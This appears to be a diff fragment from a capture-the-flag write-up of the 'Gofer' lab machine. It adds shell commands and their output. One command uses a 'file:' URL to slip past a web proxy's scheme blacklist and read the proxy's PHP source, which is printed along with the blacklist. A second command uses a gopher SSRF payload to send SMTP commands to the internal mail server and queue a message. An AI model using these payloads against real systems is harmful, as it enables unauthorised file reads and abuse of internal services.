@@ -166,3 +166,49 @@ Our dear Jocelyn received another phishing attempt last week and his habit of cl
 PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
 
 https://github.com/tarunkant/Gopherus
+
+**┌─[xbutch@parrot]─[~]
+└──╼ $curl --request POST --location "http://proxy.gofer.htb/index.php?url=file:/var/www/proxy/index.php"**
+<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy -->
+<?php
+function is_blacklisted($url) {	
+    $keywords = array("localhost", "/127", "about://", "acap://", "addbook://", "afp://", "afs://", "aim://", "applescript://", "bcp://", "bk://", "btspp://", "callto://", "castanet://", "cdv://", "chrome://", "chttp://", "cid://", "crid://", "data://", "dav://", "daytime://", "device://", "dict://", "dns://", "doi://", "dtn://", "ed2k://", "eid://", "enp://", "fax://", "feed://", "file://", "finger://", "freenet://", "ftp://", "go://", "gsiftp://", "gsm-sms://", "h323://", "h324://", "hdl://", "hnews://", "httpsy://", "iioploc://", "ilu://", "im://", "imap://", "info://", "ior://", "ip://", "ipp://", "irc://", "iris.beep://", "itms://", "jar://", "javascript://", "jdbc://", "klik://", "kn://", "lastfm://", "ldap://", "lifn://", "livescript://", "lrq://", "mac://", "magnet://", "mailbox://", "mailserver://", "mailto://", "man://", "md5://", "mid://", "mms://", "mocha://", "modem://", "moz-abmdbdirectory://", "msni://", "mtqp://", "mumble://", "mupdate://", "myim://", "news://", "nltk://", "nfs://", "nntp://", "oai://", "opaquelocktoken://", "pcast://", "phone://", "php://", "pop://", "pop3://", "pres://", "printer://", "prospero://", "pyimp://", "rdar://", "res://", "rtsp://", "rvp://", "rwhois://", "rx://", "sdp://", "secondlife://", "service://", "sip://", "sips://", "smb://", "smtp://", "snews://", "snmp://", "soap.beep://", "soap.beeps://", "soap.udp://", "subethaedit://", "svn://", "svn\+ssh://", "t120://", "tag://", "tann://", "tcp://", "tel://", "telephone://", "telnet://", "tftp://", "thismessage://", "tip://", "tn3270://", "tv://", "txmt://", "uddi://", "urn://", "uuid://", "vemmi://", "videotex://", "view-source://", "wais://", "wcap://", "webcal://", "whodp://", "whois://", "wpn://", "wtai://", "xeerkat://", "xfire://", "xmlrpc.beep://", "xmlrpc.beeps://", "xmpp://", "ymsgr://", "z39.50r://", "z39.50s");
+    foreach ($keywords as $k) {
+        if(strpos(strtolower($url), "$k") !== false) {
+            return $k;
+        }
+    }
+    return false;
+}
+if(!empty($_GET["url"])) {
+    $url = $_GET["url"];
+    $is_blacklisted = is_blacklisted($url);
+    if($is_blacklisted === false) {
+        $url = $_GET["url"];
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $url);
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+        $output = curl_exec($c);
+        curl_close($c);
+        echo $output;
+    }
+    else {
+        echo "<html><body>Blacklisted keyword: $is_blacklisted !</body></html>";
+    }
+} else {
+    echo "<html><body>Missing URL parameter !</body></html>";
+}
+?>
+
+**┌─[✗]─[xbutch@parrot]─[~]
+└──╼ $curl -X POST "http://proxy.gofer.htb/index.php?url=gopher%3A%2F%2F0.0.0.0%3A25%2F_HELO%20gofer.htb%250AMAIL%20FROM%3A%20%3Chacker%40site.com%3E%250ARCPT%20TO%3A%20%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A%20TEST%250ATEST%250A.%250AQUIT"**
+<!-- Welcome to Gofer proxy -->
+220 gofer.htb ESMTP Postfix (Debian/GNU)
+250 gofer.htb
+250 2.1.0 Ok
+250 2.1.5 Ok
+354 End data with <CR><LF>.<CR><LF>
+250 2.0.0 Ok: queued as 38F58814F
+221 2.0.0 Bye
+1
